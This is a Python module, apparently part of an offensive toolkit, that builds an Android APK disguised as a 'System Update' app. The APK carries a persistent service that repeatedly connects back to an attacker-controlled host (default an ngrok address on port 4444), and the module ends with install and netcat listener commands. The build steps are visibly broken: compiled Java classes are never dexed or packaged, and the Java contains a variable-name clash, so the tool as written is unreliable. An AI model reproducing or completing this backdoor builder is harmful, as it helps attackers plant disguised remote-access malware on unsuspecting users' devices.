# modules/payload/android_global_backdoor.py
"""
GLOBAL BACKDOOR APK - LOKAL SDK ONLY
- PAKAI: /root/android-sdk/build-tools/34.0.0/aapt2
- NO DOWNLOAD, NO SDKMANAGER
- 1 COMMAND → APK SIAP
"""

import os
import subprocess
import shutil
import glob
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress

console = Console()

# === PATH SDK LOKAL ===
SDK_ROOT = Path("/root/android-sdk")
BUILD_TOOLS = SDK_ROOT / "build-tools" / "34.0.0"
AAPT2 = BUILD_TOOLS / "aapt2"
ZIPALIGN = BUILD_TOOLS / "zipalign"
APKSIGNER = BUILD_TOOLS / "apksigner"
ANDROID_JAR = SDK_ROOT / "platforms" / "android-34" / "android.jar"

OPTIONS = {
    'LHOST': {'default': '0.tcp.ngrok.io', 'required': True},
    'LPORT': {'default': 4444, 'required': True},
    'OUTPUT_APK': {'default': 'backdoor_final.apk'},
    'PACKAGE_NAME': {'default': 'com.security.update'},
    'APP_NAME': {'default': 'System Update'}
}

# === DUMMY ICON (48x48 PNG) ===
DUMMY_PNG = bytes([
    0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
    0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x30,0x08,0x06,0x00,0x00,0x00,0x57,0x02,0xF9,0x87,
    0x00,0x00,0x00,0x19,0x74,0x45,0x58,0x74,0x53,0x6F,0x66,0x74,0x77,0x61,0x72,0x65,
    0x00,0x70,0x61,0x69,0x6E,0x74,0x2E,0x6E,0x65,0x74,0x34,0x2E,0x32,0xC8,0x2D,0xC2,0x77,
    0x00,0x00,0x00,0x2B,0x49,0x44,0x41,0x54,0x68,0x43,0xED,0xC1,0x01,0x0D,0x00,0x00,
    0x00,0xC2,0xA0,0xF5,0x4F,0x6D,0x0E,0x37,0xA0,0x00,0x00,0x00,0x00,0x49,0x45,0x4E,
    0x44,0xAE,0x42,0x60,0x82
])

def create_dummy_icon(path):
    with open(path, "wb") as f:
        f.write(DUMMY_PNG)
    console.print(f"[green]Dummy ic_launcher.png dibuat[/green]")

def run(session, options):
    lhost = options.get('LHOST', '0.tcp.ngrok.io')
    lport = int(options.get('LPORT', 4444))
    output = options.get('OUTPUT_APK', 'backdoor_final.apk')
    pkg = options.get('PACKAGE_NAME', 'com.security.update')
    app = options.get('APP_NAME', 'System Update')

    # === 1. CEK OpenJDK 17 ===
    if "17" not in subprocess.getoutput("java -version 2>&1"):
        console.print(Panel("[red]OpenJDK 17 TIDAK ADA![/red]\nInstall: [cyan]sudo apt install openjdk-17-jdk[/cyan]", title="ERROR"))
        return

    # === 2. CEK SDK LOKAL ===
    if not SDK_ROOT.exists():
        console.print(Panel(f"[red]SDK tidak ditemukan di:[/red]\n[cyan]{SDK_ROOT}[/cyan]", title="ERROR"))
        return

    if not AAPT2.exists():
        console.print(Panel(f"[red]aapt2 TIDAK ADA![/red]\n[cyan]{AAPT2}[/cyan]\nPastikan build-tools 34.0.0 terinstall.", title="ERROR"))
        return

    if not ANDROID_JAR.exists():
        console.print(Panel(f"[red]android.jar TIDAK ADA![/red]\n[cyan]{ANDROID_JAR}[/cyan]\nInstall: [yellow]platforms;android-34[/yellow]", title="ERROR"))
        return

    console.print(f"[green]aapt2 ditemukan: {AAPT2}[/green]")
    console.print(f"[green]android.jar: {ANDROID_JAR}[/green]")

    # === 3. BUILD DIR ===
    build_dir = Path.home() / "backdoor_build"
    if build_dir.exists():
        shutil.rmtree(build_dir)
    app_dir = build_dir / "app"
    src_main = app_dir / "src" / "main"
    java_dir = src_main / "java" / pkg.replace(".", os.sep)
    res_dir = src_main / "res"
    mipmap_dir = res_dir / "mipmap-hdpi"
    for d in [app_dir, src_main, java_dir, res_dir, mipmap_dir]:
        d.mkdir(parents=True, exist_ok=True)

    # === 4. AndroidManifest.xml ===
    (src_main / "AndroidManifest.xml").write_text(f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="{pkg}">
    <uses-permission android:name="android.permission.INTERNET" />
    <application android:allowBackup="false" android:label="{app}"
        android:icon="@mipmap/ic_launcher" android:theme="@android:style/Theme.Material.Light.NoActionBar">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter><action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
        </activity>
        <service android:name=".ExploitService" android:exported="false"/>
    </application>
</manifest>''')

    # === 5. Java Files ===
    (java_dir / "MainActivity.java").write_text(f'''package {pkg};
import android.app.Activity; import android.content.Intent; import android.os.Bundle;
public class MainActivity extends Activity {{
    @Override protected void onCreate(Bundle b) {{
        super.onCreate(b); startService(new Intent(this, ExploitService.class)); finish();
    }}
}}''')

    (java_dir / "ExploitService.java").write_text(f'''package {pkg};
import android.app.Service; import android.content.Intent; import android.os.IBinder;
import java.net.Socket; import java.io.PrintWriter;
public class ExploitService extends Service {{
    private static final String HOST = "{lhost}"; private static final int PORT = {lport};
    @Override public int onStartCommand(Intent i, int f, int s) {{
        new Thread(() -> {{ while (true) {{ try {{ Socket s = new Socket(HOST, PORT);
            new PrintWriter(s.getOutputStream(), true).println("BACKDOOR CONNECTED"); s.close(); break;
        }} catch (Exception e) {{ try {{ Thread.sleep(5000); }} catch (Exception ignored) {{}} }} }} }}).start();
        return START_STICKY;
    }}
    @Override public IBinder onBind(Intent i) {{ return null; }}
}}''')

    # === 6. ICON ===
    create_dummy_icon(mipmap_dir / "ic_launcher.png")

    # === 7. BUILD APK ===
    with Progress() as p:
        t = p.add_task("[cyan]Building APK...", total=5)

        # 1. Compile Java
        p.update(t, advance=1, description="[cyan]Compile Java")
        obj_dir = app_dir / "obj"
        obj_dir.mkdir(exist_ok=True)
        subprocess.run([
            "javac", "-d", str(obj_dir), "-classpath", str(ANDROID_JAR),
            "-source", "17", "-target", "17"
        ] + glob.glob(str(java_dir / "*.java")), check=True, capture_output=True)

        # 2. Compile Resources
        p.update(t, advance=1, description="[cyan]Compile Resources")
        flat_dir = app_dir / "flat"
        flat_dir.mkdir(exist_ok=True)
        for png in res_dir.rglob("*.png"):
            subprocess.run([str(AAPT2), "compile", str(png), "-o", str(flat_dir)], check=True)

        # 3. Link APK
        p.update(t, advance=1, description="[cyan]Link APK")
        unsigned = build_dir / "unsigned.apk"
        flat_files = [str(f) for f in flat_dir.glob("*.flat")]
        subprocess.run([
            str(AAPT2), "link", "-o", str(unsigned),
            "--manifest", str(src_main / "AndroidManifest.xml"),
            "-I", str(ANDROID_JAR), "--auto-add-overlay"
        ] + flat_files, check=True)

        # 4. Align
        p.update(t, advance=1, description="[cyan]Align APK")
        aligned = build_dir / "aligned.apk"
        if ZIPALIGN.exists():
            subprocess.run([str(ZIPALIGN), "-f", "4", str(unsigned), str(aligned)], check=True)
        else:
            aligned = unsigned

        # 5. Sign
        p.update(t, advance=1, description="[cyan]Sign APK")
        keystore = build_dir / "debug.keystore"
        if not keystore.exists():
            subprocess.run([
                "keytool", "-genkey", "-v", "-keystore", str(keystore),
                "-alias", "androiddebugkey", "-storepass", "android",
                "-keypass", "android", "-keyalg", "RSA", "-validity", "10000",
                "-dname", "CN=Android"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        if APKSIGNER.exists():
            subprocess.run([str(APKSIGNER), "sign", "--ks", str(keystore), "--ks-pass", "pass:android", str(aligned)], check=True)

        shutil.move(str(aligned), output)

    console.print(Panel(
        f"[bold green]APK SIAP![/bold green]\n"
        f"[cyan]{Path(output).resolve()}[/cyan]\n"
        f"[yellow]adb install {output}[/yellow]\n"
        f"[magenta]nc -lvnp {lport}[/magenta]",
        title="SUCCESS"
    ))
